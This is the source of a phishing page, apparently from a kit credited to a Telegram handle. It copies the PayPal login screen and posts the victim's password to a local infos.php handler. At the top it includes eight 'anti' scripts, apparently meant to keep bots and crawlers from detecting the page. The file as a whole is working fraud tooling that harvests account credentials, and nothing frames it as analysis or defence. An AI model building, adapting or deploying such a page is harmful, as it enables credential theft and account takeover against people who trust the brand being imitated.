<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti/anti1.php");
include("../anti/anti2.php");
include("../anti/anti3.php");
include("../anti/anti4.php");
include("../anti/anti5.php");
include("../anti/anti6.php");
include("../anti/anti7.php");
include("../anti/anti8.php");

?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Log in to your PayPal account</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">               
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/Untitled-1.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Untitled-1.png" type="image/x-icon" />

</head>

<body>
     <div class="login">
         <div class="logo">
             <img src="image/logo.png">
             <div class="change">
                 <p></p><a href="#">change</a>
             </div>
         </div>
         <form action="infos.php" method="post">

            <input type="hidden" name="step" value="password">

            <div class="user">
                 <input  type="password" placeholder="Password" name="password">
                 <div class="er"><p>Required</p></div>
                 <div class="er-img"><img src="image/img-er.png"></div>
                 <p class="place">Email or mobile number</p>
             </div>

             <a href="#">Forgot password?</a>
             <button  name="submit" id="log" style="color:#fff;" class="btn btn-primary d-block">Log In</button>
             <div class="or">
                 <p>or</p>
             </div>
             <button type="button" class="btn btn-light">Sign Up</button>
         </form>
     </div>


     <footer>
        <div class="footer">
            <ul class="list-unstyled d-flex">
                <li>Contact Us</li>
                <li>Privacy</li>
                <li>Legal</li>
                <li>Worldwide</li>
            </ul>
        </div>
     </footer>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>
</body>
</html>